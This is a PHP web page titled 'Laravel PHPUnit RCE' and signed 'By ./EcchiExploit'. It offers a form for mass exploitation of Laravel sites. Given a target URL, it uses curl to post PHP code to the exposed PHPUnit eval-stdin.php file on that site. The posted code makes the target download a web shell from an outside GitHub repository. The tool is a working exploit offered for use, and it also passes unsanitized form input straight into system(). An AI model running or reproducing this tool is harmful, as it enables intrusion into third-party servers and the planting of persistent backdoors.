<?php
$judul=@Laravel_PHPUnit_RCE;
include'sec.php';
error_reporting(0);
?>
<div class="container">
  <div class="row">
  <div class="col">
  <div class="card">
    <div class="card-header"><p><?php echo str_replace("_", " ", "$judul"); ?></p></div>
    <div class="card-body">
      <div class="table-responsive">
<?php


$shellname = $_POST['shellname'];
$url = $_POST['url'];
$foundfile = $url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";
$shellfound = $url."/vendor/phpunit/phpunit/src/Util/PHP/".$shellname;
$actual_link = $_SERVER["HTTP_HOST"];

echo '
<center>	
<form method="POST">
	<label>Url : </label>
	<input type="text" class="form-control" placeholder="http://www.helixs.tech/" name="url">
	<br>
	<label>Name Shell</label>
	<input type="text" class="form-control" name="shellname">
	<br><br>
	<button type="Submit" class="btn btn-outline-primary" name="Yamete">Yamete</button><br>
	<p class="text-danger">By ./EcchiExploit</p>
</form>
</center>';
?>
<?php

if(isset($_POST['Yamete']))
{

system("curl --data \"<?system('wget https://raw.githubusercontent.com/eviltwin-dev/eviltwin-shell/master/shell.php -O ".$shellname."');?>\" -X GET ".$url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");

 }

 
?>